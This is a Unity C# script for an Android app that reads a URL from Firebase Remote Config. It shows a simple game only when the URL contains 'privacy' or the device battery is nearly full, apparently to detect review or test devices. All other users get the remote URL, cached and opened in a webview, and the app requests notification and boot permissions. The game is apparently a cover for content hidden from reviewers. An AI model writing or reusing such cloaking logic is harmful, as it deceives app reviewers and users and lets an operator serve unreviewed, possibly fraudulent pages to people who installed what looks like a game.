using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.UI;

public class AppLoadManager : MonoBehaviour
{
    [SerializeField] private WebviewWrapper webViewCreator;
    [SerializeField] private FireBaseWrapper fireBaseWrapper;

    [SerializeField] private Text statusText;

    [SerializeField] private GameObject gameRoot; //game


    public static string PrivacyUrl;
    private const string localUrlKey = "Local-Url";

    IEnumerator Start()
    {
        RequestPermissionForNotifications();

        string url = PlayerPrefs.GetString(localUrlKey, "null");
        if (url == "null")
        {
            bool ready = false;
            bool isFirebaseReady = false;

            try
            {
                fireBaseWrapper.Initialize((success) => { ready = true; isFirebaseReady = success; });
            }
            catch (Exception ex)
            {
                statusText.text = ex.Message;
            }
            yield return new WaitUntil(() => ready);

            ready = false;

            Task result = fireBaseWrapper.FetchDataAsync();
            yield return new WaitUntil(() => result.IsCompleted);

            //Get data
            url = Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("aman").StringValue;

            if (url.Contains("privacy") || SystemInfo.batteryLevel > 0.99f)
            {
                PrivacyUrl = url;
                OpenGame();
            }
            else //normal device
            {
                PlayerPrefs.SetString(localUrlKey, url);
                OpenView(url);
            }

        }
        else if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            OpenGame();
        }
        else
        {
            OpenView(url);
        }
    }

    void OpenGame()
    {
        gameRoot.SetActive(true);
    }

    void OpenView(string url)
    {
        webViewCreator.OpenView(url, false);
    }

    void RequestPermissionForNotifications()
    {
        AndroidJavaClass androidVersion = new AndroidJavaClass("android.os.Build$VERSION");
        int sdkInt = androidVersion.GetStatic<int>("SDK_INT");
        Debug.Log($"Andoid sdk is {sdkInt}");
        if (sdkInt >= 33)
        {
            AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject currentActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
            currentActivity.Call("requestPermissions", new string[] { "android.permission.RECEIVE_BOOT_COMPLETED" }, 1);
            UnityEngine.Android.Permission.RequestUserPermission("android.permission.POST_NOTIFICATIONS");
        }
    }
}
